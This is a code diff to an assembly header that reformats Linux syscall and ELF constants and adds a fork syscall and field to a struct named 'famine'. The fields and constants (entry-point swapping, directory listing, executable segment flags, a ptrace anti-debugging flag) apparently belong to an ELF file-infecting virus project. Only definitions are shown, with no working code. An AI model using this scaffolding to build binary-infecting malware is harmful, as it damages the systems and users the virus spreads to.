@@ -10,29 +10,30 @@
 
 %define O_WRONLY	1
 %define O_RDWR      2
-%define O_APPEND	1024
-%define SEEK_END    2
-%define PROT_READ   1
-%define PROT_WRITE  2
-%define MAP_SHARED  1
-%define PT_LOAD	    1
-%define PF_X        1
-%define PF_W        2
-%define DT_DIR 4
-%define DT_REG 8
-%define GRND_RANDOM 2
-%define PTRACE_TRACEME 0
+%define O_APPEND	    1024
+%define SEEK_END        2
+%define PROT_READ       1
+%define PROT_WRITE      2
+%define MAP_SHARED      1
+%define PT_LOAD	        1
+%define PF_X            1
+%define PF_W            2
+%define DT_DIR          4
+%define DT_REG          8
+%define GRND_RANDOM     2
+%define PTRACE_TRACEME  0
 
-%define SYS_WRITE   1
-%define SYS_OPEN    2
-%define SYS_CLOSE   3
-%define SYS_LSEEK   8
-%define SYS_MMAP    9
-%define SYS_MUNMAP  11
-%define SYS_EXIT    60
-%define SYS_GETDENTS 78
-%define SYS_PTRACE  101
-%define SYS_GETRANDOM 318
+%define SYS_WRITE       1
+%define SYS_OPEN        2
+%define SYS_CLOSE       3
+%define SYS_LSEEK       8
+%define SYS_MMAP        9
+%define SYS_MUNMAP      11
+%define SYS_FORK        57
+%define SYS_EXIT        60
+%define SYS_GETDENTS    78
+%define SYS_PTRACE      101
+%define SYS_GETRANDOM   318
 
 struc   Elf64_Ehdr
     e_ident:     resb 16   ;       /* Magic number and other info */
@@ -86,5 +87,6 @@ struc famine
     pload:      resq 1
     entry:      resq 1
     oldEntry:   resq 1
+    fork:       resq 1
     fileName: resb PATH_BUFF_SIZE
 endstruc
